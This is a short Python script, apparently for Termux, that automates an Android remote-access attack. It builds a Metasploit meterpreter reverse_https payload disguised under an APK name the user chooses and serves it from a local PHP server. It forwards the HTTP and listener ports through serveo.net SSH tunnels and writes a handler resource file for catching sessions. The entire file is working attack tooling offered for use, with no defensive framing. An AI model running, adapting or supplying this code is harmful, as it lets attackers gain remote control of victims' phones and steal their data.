import os
import random
import requests
import subprocess
import time
import re
R='\033[1;31m'
port = random.randint(4444, 5555)
os.system('rm automate.rc')
with open('automate.rc', 'w') as f:
 f.write(f'use exploit/multi/handler\nset payload android/meterpreter/reverse_https\nset LHOST serveo.net\nset LPORT {port}')

def check():
 try:
  requests.get('https://www.google.com', verify=True)
  status = True
 except Exception:
  status = False
 if status == False:
  print(R)
  print('Error : No Internet connection')
  exit()
 else:
  pass

name = input ('[*] Enter APK name: ')
os.system('clear')
subprocess.Popen(["php", "-t", "/data/data/com.termux/files/home/Lemon", "-S", "localhost:4545"])
time.sleep(2)
print('\n[*] PHP Server started\n')

check()

print('\n[*] Forwarding HTTP port..\n')
subprocess.Popen(["ssh", "-o", "StrictHostKeyChecking=accept-new", "-R", "80:localhost:4545", "serveo.net"])
time.sleep(7)

print('\n[*] Generating payload using msfvenom..\n')
generate = subprocess.call(f"msfvenom -p android/meterpreter/reverse_https LHOST=serveo.net LPORT={port} R> $HOME/Lemon/{name}", shell=True)

print('\n\n[*] Forwarding TCP port..\n')
subprocess.Popen(["ssh", "-o", "StrictHostKeyChecking=accept-new", "-R", f"{port}:localhost:{port}", "serveo.net"])
time.sleep(7)

print("\n\n\nOpen a new session and give command : 'msfconsole -r automate.rc'")

